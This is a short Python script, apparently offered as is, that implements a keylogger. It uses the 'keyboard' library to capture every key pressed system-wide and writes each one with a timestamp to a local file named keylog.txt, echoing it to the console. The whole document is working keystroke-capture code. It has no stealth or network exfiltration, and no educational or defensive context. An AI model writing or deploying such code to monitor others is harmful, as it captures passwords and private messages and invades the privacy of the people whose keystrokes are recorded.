import keyboard
import time

file = open("keylog.txt", "w")

print("Keylogger started. Press Ctrl+C to stop.")

try:
    while True:

        key = keyboard.read_key()
        
        file.write(f"{time.time()}: {key}\n")
        file.flush()
        
        print(f"Key pressed: {key}")
        
except KeyboardInterrupt:
    print("Keylogger stopped.")
    
finally:
    file.close()
